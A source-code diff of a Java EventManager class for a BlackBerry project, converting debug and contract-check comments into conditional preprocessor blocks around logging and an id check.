@@ -1,3 +1,4 @@
+//#preprocess
 /* *************************************************
  * Copyright (c) 2010 - 2010
  * HT srl,   All rights reserved.
@@ -24,8 +25,9 @@ import blackberry.utils.DebugLevel;
 public final class EventManager extends Manager implements Singleton {
 
     /** The debug instance. */
-    // #debug
+    //#ifdef DEBUG
     private static Debug debug = new Debug("EventManager", DebugLevel.VERBOSE);
+    //#endif
 
     /** The instance. */
     private static EventManager instance = null;
@@ -48,8 +50,9 @@ public final class EventManager extends Manager implements Singleton {
      */
     private EventManager() {
         super();
-        // #debug debug
+        //#ifdef DEBUG_TRACE
         debug.trace("EventManager");
+        //#endif
     }
 
     /*
@@ -67,9 +70,9 @@ public final class EventManager extends Manager implements Singleton {
      */
     public TimerJob getItem(final int id) {
         final Event event = statusObj.getEvent(id);
-        // #ifdef DBC
+        //#ifdef DBC
         Check.ensures(event.eventId == id, "Wrong id");
-        // #endif
+        //#endif
         return event;
     }
 
